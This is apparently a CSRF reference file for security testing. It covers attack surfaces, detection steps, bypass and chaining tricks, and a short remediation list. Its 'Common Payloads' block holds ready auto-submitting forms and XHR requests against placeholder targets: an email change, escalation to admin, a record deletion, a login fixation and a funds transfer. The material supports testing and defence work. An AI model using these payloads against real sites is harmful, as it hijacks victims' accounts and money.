---
name: csrf
description: Cross-Site Request Forgery for unauthorized state-changing actions via victim's browser
---

# Cross-Site Request Forgery (CSRF)

## Attack Surface
- State-changing endpoints relying solely on cookies without anti-CSRF tokens
- JSON APIs accepting form-encoded content types without strict Content-Type validation
- Login forms without CSRF protection (login CSRF / session fixation)
- `SameSite=None` cookies or legacy browsers without SameSite enforcement

## Detection Techniques
- Remove CSRF token and replay; swap tokens between sessions to test binding
- Change method POST to GET; test if JSON endpoints accept form-encoded content type
- Inspect `Set-Cookie` for `SameSite` attribute; submit empty token values

## Common Payloads

```html
<!-- Auto-submitting form -->
<form id="f" action="https://target.com/account/email" method="POST">
<input type="hidden" name="email" value="a@evil.com"/>
</form><script>document.getElementById('f').submit();</script>

<!-- JSON CSRF via enctype trick -->
<form action="https://target.com/api/settings" method="POST" enctype="text/plain">
<input name='{"role":"admin","x":"' value='"}' type="hidden"/>
</form><script>document.forms[0].submit();</script>

<!-- GET-based CSRF -->
<img src="https://target.com/api/delete?id=1337" style="display:none"/>

<!-- Login CSRF -->
<form action="https://target.com/login" method="POST">
<input name="user" value="attacker"/><input name="pass" value="pass123"/>
</form><script>document.forms[0].submit();</script>

<!-- XHR CSRF with text/plain to avoid preflight -->
<script>var x=new XMLHttpRequest();x.open('POST','https://target.com/api/transfer',true);
x.withCredentials=true;x.setRequestHeader('Content-Type','text/plain');
x.send('{"to":"attacker","amount":10000}');</script>
```

## Bypass Techniques
- Remove token entirely; some servers only validate when parameter is present
- `Content-Type: text/plain` avoids CORS preflight while sending JSON-shaped body
- Chain with XSS to extract valid CSRF token then forge requests
- Bypass Referer checks with `<meta name="referrer" content="no-referrer">`

## Exploit Chaining
- CSRF + self-XSS: force victim to trigger stored XSS in their own context
- CSRF + login: fixate victim into attacker session to capture activity
- CSRF + OAuth: initiate flow with attacker's code to link attacker account

## Remediation
- Synchronizer token pattern bound to user session on all state-changing endpoints
- `SameSite=Lax` or `Strict` on authentication cookies
- Validate `Origin`/`Referer` headers; reject unexpected `Content-Type` on APIs
